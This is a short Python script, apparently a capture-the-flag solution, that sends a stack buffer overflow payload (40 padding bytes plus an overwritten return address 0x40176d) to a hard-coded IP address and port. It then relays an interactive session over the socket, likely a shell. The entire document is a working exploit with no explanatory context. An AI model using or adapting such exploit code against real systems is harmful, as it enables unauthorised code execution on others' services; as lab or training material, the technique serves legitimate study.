import socket, threading, sys
host, port = "154.57.164.73", 30188
offset, bell = 40, 0x40176d
payload = b"A"*offset + bell.to_bytes(8, "little")
s = socket.socket(); s.connect((host, port)); s.send(payload)
def rx():
    while True:
        d = s.recv(4096)
        if not d: break
        sys.stdout.write(d.decode(errors="ignore")); sys.stdout.flush()
threading.Thread(target=rx, daemon=True).start()
for line in sys.stdin: s.send(line.encode())
